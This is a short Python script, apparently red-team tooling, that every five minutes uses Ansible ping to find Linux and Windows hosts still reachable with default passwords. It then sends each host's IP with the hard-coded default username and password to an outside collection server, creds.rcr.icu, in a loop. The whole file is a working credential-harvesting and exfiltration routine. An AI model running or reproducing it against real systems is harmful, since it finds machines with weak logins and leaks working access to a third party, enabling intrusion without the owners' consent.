#run a command every 5 minutes
#check a file
#for each IP in the file, make a post request to the server
import requests
import subprocess
import time
import os
import sys
import json

def check_hosts():
    subprocess.run("ansible linux -m ping -i inventory/inv.yml | grep SUCCESS | awk '{print $1}' > defaultLinux.txt", shell=True)
    subprocess.run("ansible windows -m ping -i inventory/inv.yml | grep SUCCESS | awk '{print $1}' > defaultWindows.txt", shell=True)
    # subprocess.run("ansible routers -m ping -i inventory/inv.yml | grep SUCCESS | awk '{print $1}' > defaultRouters.txt", shell=True)

def ingest_file(os):
    if os == "linux":
        target = "defaultLinux.txt"
    elif os == "windows":
        target = "defaultWindows.txt"
    else:
        target = "defaultRouters.txt"
    with open(target, "r") as f:
        hosts = f.readlines()
    return hosts

def post_request(ip, os):
    url = "http://creds.rcr.icu/cred"

    if os == "linux":
        username = "sysadmin"
        password = "changeme"
    elif os == "windows":
        username = "Administrator"
        password = "Change.me!"
    else:
        username = "user"
        password = "pass"

    data = {
        "ip": ip,
        "username": username,
        "password": password,
    }
    r = requests.post(url, json=data)
    return r

def os_check(os):
    hosts = ingest_file(os) #get hosts
    for host in hosts: #for each host
        host = host.strip() #strip whitespace
        res = post_request(host, os) #post request
        print("Updated host: " + host + " with status code: " + str(res.status_code))

def main():
    while True:
        check_hosts() #check hosts every 5 minutes
        os_check("linux") #check linux
        os_check("windows") #check windows
        # os_check("routers") #check routers
        time.sleep(300) #sleep for 5 minutes

if __name__ == '__main__':
    main()